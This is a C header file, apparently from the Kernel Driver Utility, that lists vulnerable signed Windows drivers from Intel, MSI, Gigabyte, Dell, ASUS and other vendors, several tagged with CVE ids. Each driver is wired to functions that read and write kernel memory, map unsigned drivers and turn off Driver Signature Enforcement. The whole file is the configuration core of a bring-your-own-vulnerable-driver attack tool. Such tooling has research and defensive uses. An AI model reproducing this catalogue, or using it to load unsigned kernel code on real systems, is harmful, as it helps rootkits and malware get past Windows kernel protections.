/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       KDUPLIST.H
*
*  VERSION:     1.20
*
*  DATE:        14 Feb 2022
*
*  Providers global list.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Victims public array.
//
static KDU_VICTIM_PROVIDER g_KDUVictims[] = {
    {
        (LPCWSTR)PROCEXP152,              // Device and driver name,
        (LPCWSTR)PROCEXP_DESC,            // Description
        IDR_PROCEXP,                      // Resource id in drivers database
        GENERIC_READ | GENERIC_WRITE,     // Desired access flags used for acquiring victim handle
        KDU_VICTIM_FLAGS_SUPPORT_RELOAD,  // Victim flags, target dependent
        VpCreateCallback,                 // Victim create callback
        VpReleaseCallback,                // Victim release callback
        VpExecuteCallback                 // Victim execute payload callback
    }
};

//
// Providers public array, unsupported methods must be set to provider stub and cannot be NULL.
//
static KDU_PROVIDER g_KDUProviders[] =
{
    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_iQVM64,
        SourceBaseNone,
        KDUPROV_FLAGS_NONE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2015-2291",
        (LPWSTR)L"NalDrv",
        (LPWSTR)L"Nal",
        (LPWSTR)L"Intel Corporation",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)NalReadVirtualMemoryEx,
        (provWriteKernelVM)NalWriteVirtualMemoryEx,

        (provVirtualToPhysical)NalVirtualToPhysical,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_RTCORE64,
        SourceBaseNone,
        KDUPROV_FLAGS_NONE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2019-16098",
        (LPWSTR)L"RTCore64",
        (LPWSTR)L"RTCore64",
        (LPWSTR)L"MICRO-STAR INTERNATIONAL CO., LTD.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)RTCoreReadVirtualMemory,
        (provWriteKernelVM)RTCoreWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_GDRV,
        SourceBaseMapMem,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2018-19320",
        (LPWSTR)L"Gdrv",
        (LPWSTR)L"GIO",
        (LPWSTR)L"Giga-Byte Technology",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)MapMemRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)GioReadKernelVirtualMemory,
        (provWriteKernelVM)GioWriteKernelVirtualMemory,

        (provVirtualToPhysical)GioVirtualToPhysical,
        (provQueryPML4)GioQueryPML4Value,
        (provReadPhysicalMemory)GioReadPhysicalMemory,
        (provWritePhysicalMemory)GioWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ATSZIO64,
        SourceBaseNone,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASUSTeK WinFlash",
        (LPWSTR)L"ATSZIO",
        (LPWSTR)L"ATSZIO",
        (LPWSTR)L"ASUSTeK Computer Inc.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)AtszioReadKernelVirtualMemory,
        (provWriteKernelVM)AtszioWriteKernelVirtualMemory,

        (provVirtualToPhysical)AtszioVirtualToPhysical,
        (provQueryPML4)AtszioQueryPML4Value,
        (provReadPhysicalMemory)AtszioReadPhysicalMemory,
        (provWritePhysicalMemory)AtszioWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_MSIO64,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2019-18845",
        (LPWSTR)L"MsIo64",
        (LPWSTR)L"MsIo",
        (LPWSTR)L"MICSYS Technology Co., Ltd.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_GLCKIO2,
        SourceBaseWinIo,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASRock Polychrome RGB, multiple CVE ids",
        (LPWSTR)L"GLCKIo2",
        (LPWSTR)L"GLCKIo2",
        (LPWSTR)L"ASUSTeK Computer Inc.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ENEIO64,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"G.SKILL Trident Z Lighting Control",
        (LPWSTR)L"EneIo64",
        (LPWSTR)L"EneIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_REDSTONE3,
        IDR_WINRING0,
        SourceBaseWinRing0,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"EVGA Precision X1",
        (LPWSTR)L"WinRing0x64",
        (LPWSTR)L"WinRing0_1_2_0",
        (LPWSTR)L"EVGA",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WRZeroReadKernelVirtualMemory,
        (provWriteKernelVM)WRZeroWriteKernelVirtualMemory,

        (provVirtualToPhysical)WRZeroVirtualToPhysical,
        (provQueryPML4)WRZeroQueryPML4Value,
        (provReadPhysicalMemory)WRZeroReadPhysicalMemory,
        (provWritePhysicalMemory)WRZeroWritePhysicalMemory,
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ENETECHIO64,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Thermaltake TOUGHRAM Software",
        (LPWSTR)L"EneTechIo64",
        (LPWSTR)L"EneTechIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PHYMEMX64,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Huawei MateBook Manager",
        (LPWSTR)L"phymemx64",
        (LPWSTR)L"PhyMem",
        (LPWSTR)L"Huawei Technologies Co.,Ltd.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_REDSTONE3,
        IDR_RTKIO64,
        SourceBasePhyMem,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Realtek Dash Client Utility",
        (LPWSTR)L"rtkio64",
        (LPWSTR)L"rtkio",
        (LPWSTR)L"Realtek Semiconductor Corp.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)PhyMemReadKernelVirtualMemory,
        (provWriteKernelVM)PhyMemWriteKernelVirtualMemory,

        (provVirtualToPhysical)PhyMemVirtualToPhysical,
        (provQueryPML4)PhyMemQueryPML4Value,
        (provReadPhysicalMemory)PhyMemReadPhysicalMemory,
        (provWritePhysicalMemory)PhyMemWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ENETECHIO64B,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"MSI Dragon Center",
        (LPWSTR)L"EneTechIo64",
        (LPWSTR)L"EneTechIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)WinIoUnregisterDriver,
        (provPreOpenDriver)WinIoPreOpen,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_REDSTONE3,
        IDR_LHA,
        SourceBaseNone,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2019-8372",
        (LPWSTR)L"lha",
        (LPWSTR)L"{E8F2FF20-6AF7-4914-9398-CE2132FE170F}",
        (LPWSTR)L"LG Electronics Inc.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)LHAReadKernelVirtualMemory,
        (provWriteKernelVM)LHAWriteKernelVirtualMemory,

        (provVirtualToPhysical)LHAVirtualToPhysical,
        (provQueryPML4)LHAQueryPML4Value,
        (provReadPhysicalMemory)LHAReadPhysicalMemory,
        (provWritePhysicalMemory)LHAWritePhysicalMemory,
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASUSIO2,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASUS GPU Tweak",
        (LPWSTR)L"AsIO2",
        (LPWSTR)L"Asusgio2",
        (LPWSTR)L"ASUSTeK Computer Inc.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DIRECTIO64,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"PassMark DirectIO",
        (LPWSTR)L"DirectIo64",
        (LPWSTR)L"DIRECTIO64",
        (LPWSTR)L"PassMark Software Pty Ltd",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DI64ReadKernelVirtualMemory,
        (provWriteKernelVM)DI64WriteKernelVirtualMemory,

        (provVirtualToPhysical)DI64VirtualToPhysical,
        (provQueryPML4)DI64QueryPML4Value,
        (provReadPhysicalMemory)DI64ReadPhysicalMemory,
        (provWritePhysicalMemory)DI64WritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_GMERDRV,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Gmer 'Antirootkit'",
        (LPWSTR)L"gmerdrv",
        (LPWSTR)L"gmerdrv",
        (LPWSTR)L"GMEREK Systemy Komputerowe Przemyslaw Gmerek",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)GmerRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)GmerReadVirtualMemory,
        (provWriteKernelVM)GmerWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DBUTIL23,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_UNLOAD_SUP,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2021-21551",
        (LPWSTR)L"DBUtil23",
        (LPWSTR)L"DBUtil_2_3",
        (LPWSTR)L"Dell Inc.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DbUtilReadVirtualMemory,
        (provWriteKernelVM)DbUtilWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_MIMIDRV,
        SourceBaseNone,
        KDUPROV_FLAGS_NONE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Mimikatz mimidrv",
        (LPWSTR)L"mimidrv",
        (LPWSTR)L"mimidrv",
        (LPWSTR)L"Benjamin Delpy",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)MimidrvReadVirtualMemory,
        (provWriteKernelVM)MimidrvWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_21H2,
        IDR_KPH,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"KProcessHacker",
        (LPWSTR)L"KProcessHacker",
        (LPWSTR)L"KProcessHacker2",
        (LPWSTR)L"Wen Jia Liu",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)KphRegisterDriver,
        (provUnregisterDriver)KphUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)KphReadKernelVirtualMemory,
        (provWriteKernelVM)KphWriteKernelVirtualMemory,

        (provVirtualToPhysical)KphVirtualToPhysical,
        (provQueryPML4)KphQueryPML4Value,
        (provReadPhysicalMemory)KphReadPhysicalMemory,
        (provWritePhysicalMemory)KphWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_21H2,
        IDR_PROCEXP,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PML4_FROM_LOWSTUB | KDUPROV_FLAGS_NO_VICTIM,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)PROCEXP_DESC,
        (LPWSTR)PROCEXP152,
        (LPWSTR)PROCEXP152,
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)PexRegisterDriver,
        (provUnregisterDriver)PexpUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)PexReadKernelVirtualMemory,
        (provWriteKernelVM)PexWriteKernelVirtualMemory,

        (provVirtualToPhysical)PexVirtualToPhysical,
        (provQueryPML4)PexQueryPML4Value,
        (provReadPhysicalMemory)PexReadPhysicalMemory,
        (provWritePhysicalMemory)PexWritePhysicalMemory
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DBUTILDRV2,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2021-36276",
        (LPWSTR)L"DBUtilDrv2",
        (LPWSTR)L"DBUtil_2_5",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher",

        (provStartVulnerableDriver)DbUtilStartVulnerableDriver,
        (provStopVulnerableDriver)DbUtilStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DbUtilReadVirtualMemory,
        (provWriteKernelVM)DbUtilWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DBK64,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_NO_VICTIM,
        KDUPROV_SC_V4,
        (LPWSTR)L"Cheat Engine Dbk64",
        (LPWSTR)L"CEDRIVER73",
        (LPWSTR)L"CEDRIVER73",
        (LPWSTR)L"Cheat Engine",

        (provStartVulnerableDriver)DbkStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)DbkMapDriver,
        (provControlDSE)DbkControlDSE,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASUSIO3,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASUS GPU Tweak II",
        (LPWSTR)L"AsIO3",
        (LPWSTR)L"Asusgio3",
        (LPWSTR)L"ASUSTeK Computer Inc.",

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)AsusIO3UnregisterDriver,
        (provPreOpenDriver)AsusIO3PreOpen,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory
    }
};
